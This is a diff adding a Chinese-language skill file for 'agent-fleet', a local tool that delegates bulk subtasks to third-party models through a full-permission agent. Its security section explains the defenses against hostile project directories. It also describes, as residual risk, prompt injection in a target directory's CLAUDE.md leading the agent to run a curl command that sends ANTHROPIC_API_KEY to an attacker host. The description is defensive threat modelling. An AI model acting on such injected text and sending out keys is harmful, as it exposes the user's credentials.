@@ -1,0 +1,170 @@
+---
+name: agent-fleet
+description: 把机械化、大批量、对模型能力要求不高的子任务派给第三方模型(DeepSeek、Kimi/Moonshot,以及用户自备网关接入的 Gemini 或任何 Anthropic 兼容端点)去跑,省下 Claude 自己的 token 和上下文——用户已经用自己的 API Key 配置好 agent-fleet 时优先使用。底层是 Claude Agent SDK 驱动的一个 bypassPermissions 自主 Agent(能读写文件、跑 bash、多轮工具调用直到任务完成),纯本地工具,完全不经过 Kollab 或任何托管基础设施。当用户说"用便宜模型跑一下""省点 token""派给 DeepSeek/Kimi/Gemini""这个不需要用 Claude 做,批量处理一下就行""同时开几个后台任务分别用不同模型跑""用 agent-fleet"或类似意图时,必须使用本 Skill。也适用于 Claude 自己判断"这一步是机械抄写/批量翻译/大批量格式转换/低难度调研,没必要烧自己的 token"、想主动把子任务甩出去的场景。使用前必须确认目标模型在 `.env` 里配置了真实第三方 API Key(工具会给出清晰的缺失提示,不会静默失败);目标工作目录(`--cwd`)会被当作不可信输入处理。
+---
+
+# agent-fleet
+
+个人本地 CLI 工具,路径 `/Users/kcsx/Project/kcsx/macmini/yan-skills/agent-fleet/`。核心用途:
+**把一个任务派给别的模型去跑,而不是自己动手**——尤其是那种"谁做都行、不需要 Claude 的判断力,
+但数量大或很机械"的子任务(批量翻译、批量格式转换、大批量抄写、低难度调研/头脑风暴)。这样
+可以省下 Claude 自己的 token,而不是每一步都用 Claude 亲自执行。
+
+它和 Kollab 产品完全无关,是一个独立的个人工具仓库(`yan-skills`),不接入任何托管基础设施、
+不使用任何托管账号体系——每个模型接的都是**用户自己的**第三方 API key(BYOK)。
+
+## 什么时候用 / 什么时候不用
+
+**用**:任务是机械化的(不需要多少判断力就能做对)、批量的(同类任务重复很多次)、或对模型能力
+要求不高(普通翻译、格式转换、常规调研摘要、批量文件级小改动),且目标模型已经在 `.env` 里配好
+真实 key。想同时跑多个不同模型的任务(比如一个用 Gemini 写文案、一个用 DeepSeek 做调研,两个
+并行互不干扰)是最典型的场景。
+
+**不用**:任务需要深度架构判断、涉及本仓库(Kollab 或其它有专属规范的项目)需要遵守复杂工程规范
+的改动、或者目标工作目录来路不明——agent-fleet 跑的是 `bypassPermissions` 全权限 Agent,对
+prompt injection 没有免疫力(见下方「安全边界」),不适合处理完全不信任的目录。
+
+## 首次使用前置检查
+
+```bash
+cd /Users/kcsx/Project/kcsx/macmini/yan-skills/agent-fleet
+npm install                       # 首次使用需要装依赖
+cp .env.example .env              # 复制密钥模板(仅第一次)
+# 然后手动编辑 .env,填入真实的 DEEPSEEK_API_KEY / MOONSHOT_API_KEY / ...
+node bin/agent-fleet.mjs list-models   # 检查每个模型的密钥是 present 还是 missing
+```
+
+`list-models` 只报告密钥 present/missing,绝不会打印密钥本身的值。如果某个模型显示
+`missing`,直接告诉用户去哪填(见下方模型列表的官方注册地址),不要猜测或编造一个值。
+
+## 核心命令(可直接照抄执行)
+
+### `run` —— 跑单个任务
+
+```bash
+node bin/agent-fleet.mjs run --model <友好名字> --prompt "<任务描述>" [--cwd <目录>] [--json]
+```
+
+真实示例(来自项目自带文档,原样可执行):
+
+```bash
+# 用 DeepSeek Flash 做一次调研/头脑风暴
+node bin/agent-fleet.mjs run \
+  --model deepseek-v4-flash \
+  --prompt "帮我调研一下 XX 竞品有哪些定价策略,写一份简短总结"
+
+# 用 Kimi 在指定项目目录里干活,输出结构化 JSON 方便脚本解析
+node bin/agent-fleet.mjs run \
+  --model kimi \
+  --prompt "把这个目录下的 README 翻译成英文,直接改文件" \
+  --cwd ~/some-project \
+  --json
+```
+
+`run` 的完整参数(摘自 `bin/agent-fleet.mjs` 的 `--help`):
+
+| 参数 | 必填 | 说明 |
+|---|---|---|
+| `--model <name>` | 是 | `models.config.json` 里的友好名字,如 `deepseek-v4-flash` |
+| `--prompt <text>` | 是 | 任务描述 |
+| `--cwd <dir>` | 否 | Agent 读写文件/跑 bash 的工作目录,默认当前目录;**被当作不可信输入**,见下方安全边界 |
+| `--max-turns <n>` | 否 | 限制最大工具调用轮数,避免任务跑飞 |
+| `--system-prompt <text>` | 否 | 追加的系统提示 |
+| `--json` | 否 | 输出结构化 JSON(`ok`/`result`/`numTurns`/`totalCostUsd`/`sessionId` 等字段) |
+| `--models-config <path>` | 否 | 临时换一份配置文件,默认用包目录下的 `models.config.json` |
+
+想同时跑多个不同模型的任务,最简单的办法是开多个终端(或 `&` 丢后台)各自 `run` 一次——每次
+调用是独立进程,天然支持并发,不需要在单进程里做多模型切换。
+
+### `run-many` —— 一次命令批量并发跑一批任务
+
+```bash
+node bin/agent-fleet.mjs run-many --config batch.json [--json]
+```
+
+`batch.json` 是一个数组,每一项 `{ model, prompt, cwd? }`:
+
+```json
+[
+  { "model": "gemini", "prompt": "写一段产品介绍文案" },
+  { "model": "deepseek-v4-flash", "prompt": "调研一下同类产品的定价策略" }
+]
+```
+
+内部用 `Promise.allSettled` 真正并发执行,每个任务独立成败,一个失败不影响其它任务,最后按
+原始顺序把每个任务各自的结果一起返回。
+
+### `list-models` —— 看有哪些模型可用、密钥配没配
+
+```bash
+node bin/agent-fleet.mjs list-models
+```
+
+## 支持的模型(来自 `models.config.json`,如实列出,没有编造端点)
+
+| 友好名字 | 上游 | 接入方式 | 说明 |
+|---|---|---|---|
+| `deepseek-v4-pro` | DeepSeek | 官方 Anthropic 兼容端点 `https://api.deepseek.com/anthropic`,`x-api-key` 鉴权 | Opus 档位映射目标,适合需要最高质量单次产出的任务 |
+| `deepseek-v4-flash` | DeepSeek | 同上端点,`model: "deepseek-flash"` | 官方默认回退模型,快、便宜,适合调研/头脑风暴/大批量任务 |
+| `kimi` | Moonshot(Kimi) | 官方 Anthropic 兼容端点 `https://api.moonshot.cn/anthropic`(中国站),`auth-token` 鉴权 | 国际站把 `baseURL` 换成 `https://api.moonshot.ai/anthropic` 即可,鉴权方式不变 |
+| `gemini` | Google | **没有官方端点**,`baseURL`/`model` 在配置里留空 | 见下方「已知限制」,选它会直接报错退出,不会假装能跑 |
+
+模型 ID 会随官方迭代变化,需要时核对:DeepSeek 见
+<https://api-docs.deepseek.com/guides/anthropic_api>,Kimi 见
+<https://platform.kimi.com/docs/api/list-models>。改 `models.config.json` 就能加/改/删可用
+模型,这个文件本身不含任何密钥,`apiKeyEnv` 只是"去读哪个环境变量"的指针,真实值永远只在
+`.env` 里(已被 `.gitignore` 排除)。
+
+## 已知限制(如实说明,不美化)
+
+- **Gemini 没有官方 Anthropic 兼容端点**:Google 官方未提供类似 DeepSeek/Moonshot 那样的
+  `/anthropic` 路径。要用 Gemini,用户必须自己搭一个能把 Anthropic Messages 协议转换成
+  Gemini 请求的网关(比如自建 LiteLLM proxy),把网关地址和它认的模型 ID 填进
+  `models.config.json` 的 `gemini` 条目;不填的话选这个模型会直接报错退出。
+- **尚未做过真实第三方模型的端到端验证**:项目作者手头没有真实的 DeepSeek/Moonshot API key,
+  所以没有跑过一次真实模型调用。已经做到的验证是:(1)`--help`/`--version`/`list-models`/
+  缺参数缺密钥等错误路径手动跑过,报错清晰;(2)`npm run smoke-test` —— 自建一个模拟
+  Anthropic Messages 协议的本地假上游,真跑一次完整的 `run` 和 `run-many`,断言请求确实发到
+  配置的 `baseURL`、两种鉴权方式都生效、`run-many` 真的并发;(3)`npm run security-test` ——
+  针对下方安全边界的专项回归测试,同样用本地假上游,不需要真实密钥。**首次真实使用前**,建议
+  先用 `list-models` 确认密钥 present,再用一句简单 prompt(如"说一句你好")跑一次
+  `run --json` 验证端到端可用,而不是直接扔大任务上去。
+- **`bypassPermissions` 全权限,没有沙箱**:Agent 会真的读写文件、跑 bash,不会逐步询问用户
+  确认。任务描述含糊,或 `--cwd` 指向了不该碰的目录(比如用户主目录本身),它是有可能读到甚至
+  改到不该动的文件的。`--cwd` 要指向具体的项目目录,不要指向 `~`。
+
+## 安全边界:`--cwd` 目标目录当作不可信输入处理
+
+`--cwd` 指向的目标工作目录被当作**不可信输入**,原因是这个工具的典型用法就是"拿去处理一个
+可能来自外部的项目文件夹"(别人发的仓库、下载的模板)。代码里的处理方式(读自
+`src/project-trust.mjs` + `src/isolated-env.mjs`,不是推测):
+
+- **前置闸门(`assertProjectSettingsTrusted`)**:在任何密钥被读入内存、注入子进程环境**之前**,
+  先扫描 `--cwd` 及其所有上级目录(直到用户 home 为止)里的 `.claude/settings.json` /
+  `settings.local.json`。如果这些文件里出现 `env` 块(哪怕只有一个变量)、或者
+  `hooks`/`statusLine`/`apiKeyHelper`/`awsAuthRefresh`/`enabledPlugins` 等"能自动执行命令
+  或决定凭据来源"的顶层字段,**整次运行直接报错退出**,连密钥都不会被读进内存。这不是 bug,
+  是刻意的 fail-closed——目标目录可以描述"在这里干什么活"(`CLAUDE.md`、项目权限这类本地行为
+  配置照常生效),但不能决定"请求发去哪、带什么凭据、启动时自动跑什么命令"。
+- **结构性兜底(`buildPinnedSettings`)**:即使前置闸门有遗漏,`ANTHROPIC_BASE_URL`、
+  `CLAUDE_CONFIG_DIR`、以及 `PATH`/`NODE_OPTIONS`/`BASH_ENV`/`LD_PRELOAD` 等"决定新进程执行
+  什么代码"的变量,会被钉进 SDK 调用里优先级最高的 flag 层 settings,压过目标目录能设置的
+  任何值——所以 `--cwd` 目录**不会**被用来改 `baseURL`,也不会通过篡改 `PATH`/`env` 触发对
+  该目录下文件的自动执行。
+- **宿主环境隔离(`buildIsolatedEnv`)**:每次调用前会把继承自宿主进程的 `ANTHROPIC_*` /
+  `CLAUDE_*` 环境变量整族剥离,再只叠回本次任务真正需要的那几个,防止(比如嵌套在另一个
+  Claude Code 会话里跑这个工具时)宿主自己的登录态或自定义请求头被带到第三方 baseURL。
+- **残留风险(如实说明,不夸大防护强度)**:上面挡的是"零交互、纯配置驱动"的静默劫持。但
+  agent-fleet 跑的是 `bypassPermissions` 自主 Agent,目标目录里的 `CLAUDE.md` 或任何会被
+  读到的文件,仍然可以对模型做 prompt injection,诱导它自己执行
+  `curl 攻击者地址 -d "$ANTHROPIC_API_KEY"`,或读取并外发这台机器上的其它敏感文件。这条路径
+  不是配置层能解决的,处理来路不明的目录时应该把它当不可信代码看待,或干脆不用这个工具处理。
+
+## 参考文件
+
+- 完整安全边界、验证细节、接下来要做的事:
+  [`../README.md`](../README.md)
+- 模型接入参数唯一真相源:[`../models.config.json`](../models.config.json)
+- CLI 入口与参数解析:[`../bin/agent-fleet.mjs`](../bin/agent-fleet.mjs)
+- 安全测试:`npm test`(等价于 `npm run smoke-test && npm run security-test`),不需要任何
+  真实密钥,随时可以重跑确认这份安全边界描述仍然成立。
